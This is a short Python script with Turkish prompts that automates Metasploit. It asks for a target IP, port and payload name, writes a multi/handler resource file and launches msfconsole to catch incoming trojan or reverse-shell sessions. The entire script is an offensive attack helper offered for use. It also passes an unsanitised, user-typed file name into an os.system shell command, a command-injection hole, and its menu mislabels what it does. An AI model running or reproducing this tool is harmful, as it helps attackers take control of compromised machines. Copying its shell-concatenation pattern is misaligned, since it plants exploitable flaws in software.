#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os

import time

os.system("clear")

os.system("figlet MSFCONSOLE")

print("""

1) Local ip adresine yönelik payload oluşturma

2) Dış ip adreslerine yönelik payload oluşturma



""")

secenek = input("Seçenek: ")

print("""
""")

if secenek == "1":
    
    ip = input("Hedef ip: ")

    print("""
    """)

    port = input("Port: ")

    print("""
    """)

    trojan = input("Payload: ")

    print("""
    """)

    isim1 = input("Bu veriler bir dosyaya kaydadileceği için dosya seçmeniz gerekiyor. Bu yüzden daha önce girmediğiniz bir dosya ismi girin: ")

    time.sleep(3)

    dosya = open(isim1 + ".txt", "w")

    dosya.write("""use multi/handler
    set payload """ + trojan + """
    set LHOST """ + ip + """
    set LPORT """ + port + """
    exploit""")

    dosya.close()

    os.system("msfconsole -r " + isim1 + ".txt")

elif secenek == "2":
    ip = input("Hedef ip: ")

    print("""
    """)

    lip = input("Local ip: ")

    port = input("Port: ")

    print("""
    """)

    trojan = input("Payload: ")
    print("""
    """)

    isim = input("Bu veriler bir dosyaya kaydadileceği için dosya seçmeniz gerekiyor. Bu yüzden daha önce girmediğiniz bir dosya ismi girin: ")

    time.sleep(3)

    dosya1 = open(isim + ".txt", "w")

    dosya1.write("""use multi/handler
    set payload """ + trojan + """
    set RHOST """ + ip + """
    set RPORT """ + port + """
    set LHOST """ + lip + """
    exploit""")

    dosya1.close()

    os.system("msfconsole -r " + isim + ".txt")

else:

    exit()
